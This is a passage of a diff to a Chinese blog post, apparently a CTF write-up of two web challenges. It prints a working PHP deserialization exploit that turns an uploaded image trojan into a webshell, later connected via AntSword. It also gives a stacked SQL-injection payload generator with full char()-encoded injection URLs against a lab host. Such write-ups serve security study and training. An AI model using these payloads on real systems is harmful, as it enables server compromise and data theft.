+<p>而进入该函数后，我们会触发<code>$this-&gt;index</code>,成功尝试调用类Profile中不存在的对象，于是可触发<code>__get</code>魔法方法，从而变成<code>return $this-&gt;except[&#39;index&#39;]</code>;，那么我们只要在构造序列化时，将<code>except</code>赋值为数组，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br></pre></td></tr></table></figure>
+<p>即可在类Register进行<code>__destruct()</code>时，成功触发<code>upload_img</code>函数，进行文件复制和改名</p>
+<p>以下是我们的攻击链：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Register-&gt;__destruct</span><br><span class="line">Profile-&gt; __call</span><br><span class="line">Profile-&gt; __get</span><br><span class="line">Profile-&gt; upload_img()</span><br></pre></td></tr></table></figure>
+<p>流程图大概如下：</p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/19.png" alt></p>
+<p>而我们只需要控制<code>__get</code>的<code>except</code>的值，就可以调用任意方法。</p>
+<p>综上所述，我们构造以下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/9c1534b1e8dbb5a0c0ec3f70d24f9627/0d44a7f4f1ae189a4c1d88b83f66ec68.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/9c1534b1e8dbb5a0c0ec3f70d24f9627/ethan.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先，我们上传一个图片马，然后利用我们得到的payload替换cookie，刷新后即可找到修改后缀后的php文件</p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/10.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/16.png" alt></p>
+<p>使用蚁剑连接我们的木马，成功拿到shell</p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/18.png" alt></p>
+<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a><strong>随便注</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.fuzzer.xyz/images/qwb/20.png" alt></p>
+<p>这里过滤了<code>selec</code>t和<code>.</code>，所以跨表查询存在难道，因此这里使用堆叠注入和<code>char</code>进行<code>bypass</code></p>
+<p><code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"0';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;"</span></span><br><span class="line"><span class="comment">#exp = 'select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()'</span></span><br><span class="line"><span class="comment">#exp = "select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='1919810931114514'"</span></span><br><span class="line">exp = <span class="string">"select flag from `1919810931114514`"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">	res += <span class="string">"char(%s),"</span>%(ord(i))</span><br><span class="line">my_payload = payload%(res[:<span class="number">-1</span>])</span><br><span class="line">print(my_payload)</span><br></pre></td></tr></table></figure>
+<p>获取表名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.23.166:8888/?inject=0';set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE a FROM @s;EXECUTE a;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://www.fuzzer.xyz/images/qwb/21.png" alt></p>
+<p>获取字段名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.23.166:8888/?inject=0';set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(67),char(79),char(76),char(85),char(77),char(78),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(67),char(79),char(76),char(85),char(77),char(78),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(61),char(39),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(39));PREPARE a FROM @s;EXECUTE a;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://www.fuzzer.xyz/images/qwb/22.png" alt></p>
+<p>获取flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.23.166:8888/?inject=0';set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://www.fuzzer.xyz/images/qwb/23.png" alt></p>
 
     </article>
     <!-- license  -->
@@ -490,17 +490,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2018/09/02/萌萌哒报名系统/" title="CTF&&lctf">
-                    <div class="nextTitle">CTF&&lctf</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2018/08/28/时光/" title="时光说">
-                    <div class="prevTitle">时光说</div>
+                <a href="/2019/05/27/charles破解/" title="charles破解">
+                    <div class="prevTitle">charles破解</div>
                 </a>
             
         </li>
@@ -639,7 +634,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题记"><span class="toc-number">1.</span> <span class="toc-text">题记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-number">3.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随便注"><span class="toc-number">4.</span> <span class="toc-text">随便注</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
